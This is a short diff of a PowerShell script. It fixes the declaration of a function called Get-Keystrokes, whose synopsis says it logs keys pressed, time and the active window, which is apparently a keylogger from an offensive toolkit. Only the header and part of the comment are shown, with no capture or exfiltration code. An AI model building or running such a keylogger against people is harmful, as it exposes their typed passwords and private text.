@@ -1,4 +1,4 @@
-function Get-Keystrokes -Timeout 10 {
+function Get-Keystrokes {
 <#
 .SYNOPSIS
     Logs keys pressed, time and the active window.
